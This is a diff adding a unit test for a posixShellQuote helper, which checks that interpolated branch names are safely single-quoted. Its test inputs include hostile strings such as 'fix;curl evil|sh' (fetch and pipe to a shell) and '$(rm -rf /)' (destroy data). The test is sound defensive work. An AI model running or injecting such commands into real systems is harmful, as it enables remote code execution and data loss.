@@ -8,6 +8,7 @@ import {
 	normalizePath,
 	parseTupleKey,
 	platformShortcutLabel,
+	posixShellQuote,
 	projectRelativePath,
 	shallowEqualArrays,
 	stripFrontmatter,
@@ -30,6 +31,15 @@ test("platform shortcuts use Command on Apple platforms", () => {
 	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(true);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(false);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
+});
+
+test("posixShellQuote neutralizes shell metacharacters in an interpolated value", () => {
+	expect(posixShellQuote("feature-branch")).toBe("'feature-branch'");
+	expect(posixShellQuote("")).toBe("''");
+	// A hostile branch name stays inert literal data — no operator, subshell, or quote can break out.
+	expect(posixShellQuote("fix;curl evil|sh")).toBe("'fix;curl evil|sh'");
+	expect(posixShellQuote("a'b")).toBe("'a'\\''b'");
+	expect(posixShellQuote("$(rm -rf /)")).toBe("'$(rm -rf /)'");
 });
 
 test("isMarkdownPath matches .md/.markdown case-insensitively, nothing else", () => {
